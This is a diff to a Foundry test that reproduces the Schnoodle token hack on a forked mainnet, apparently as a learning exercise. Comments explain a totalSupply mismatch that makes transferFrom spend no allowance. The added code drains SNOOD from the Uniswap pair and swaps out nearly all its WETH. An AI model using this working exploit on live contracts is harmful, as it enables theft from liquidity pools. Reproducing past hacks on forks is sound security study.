@@ -14,8 +14,23 @@ contract SchnoodleHack is Test {
     function testSchnoodleHack() public {
         vm.createSelectFork(vm.envString("ETH_RPC_URL"), 14983600);
         console.log("Your Starting WETH Balance:", weth.balanceOf(address(this)));
-        
+
         // INSERT EXPLOIT HERE
+        
+        // SchnoodleV9Base._totalSupply vs ERC777Upgradeable._totalSupply big difference 
+        // SchnoodleV9Base._totalSupply = initialTokens * 10 ** decimals(); => 1000000000000 * 1e18 = 1000000000000000000000000000000 
+        // ERC7ERC777Upgradeable._totalSupply = (2^256 - 1) - ((2^256 - 1) % SchnoodleV9Base._totalSupply) => 115792089237316195423570985008687907853269984665000000000000000000000000000000
+        // results in SchnoodleV9Base._getStandardAmount returning 0 in _spendAllowance() because _getReflectRate returns too big
+        // of a number due to initialization of the _totalSupply's
+        // results in 0 allowance being spent allowing everyone to transfer tokens from anyone via transferFrom. 
+        // too many words, do exploit pls
+
+        uint256 uniSnoodBalance = snood.balanceOf(address(uniswap)) - 1;
+        snood.transferFrom(address(uniswap), address(this), uniSnoodBalance);
+        uniswap.sync();
+        (uint112 reservesWETH, ,) = uniswap.getReserves();
+        snood.transfer(address(uniswap), uniSnoodBalance);
+        uniswap.swap(reservesWETH - 1, 0, address(this), "");
 
         console.log("Your Final WETH Balance:", weth.balanceOf(address(this)));
         assert(weth.balanceOf(address(this)) > 100 ether);
